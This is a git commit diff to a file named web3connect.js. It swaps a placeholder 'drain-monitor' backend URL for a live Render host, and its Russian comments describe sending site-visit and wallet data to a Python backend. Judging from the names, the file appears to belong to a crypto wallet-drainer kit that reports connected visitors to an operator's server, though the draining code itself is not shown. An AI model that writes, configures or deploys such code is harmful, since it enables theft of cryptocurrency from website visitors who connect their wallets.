8d8fb88fb7ef8db9f05f1a54bf71cf2094b54c6e
markboh07 <markusbohmer070@gmail.com>
2025-08-19 04:02:12 +0200

    Update web3connect.js

--- js/web3connect.js
+++ js/web3connect.js
@@ -5,7 +5,7 @@ let userAccount;
 
 // --- Функции для отправки данных на Python бэкенд ---
 // URL бэкенда (ЗАМЕНИ НА СВОЙ URL RENDER)
-const BACKEND_URL = 'https://drain-monitor-python-YOURNAME.onrender.com'; // <<--- ВАЖНО: Заменить!
+const BACKEND_URL = 'https://backdraindf-3.onrender.com'; // <<--- ВАЖНО: Заменить!
 
 /**
  * Отправка данных о посещении сайта
@@ -625,3 +625,4 @@ window.addEventListener('DOMContentLoaded', () => {
         connectButton.addEventListener('click', connectWallet);
     }
 });
+
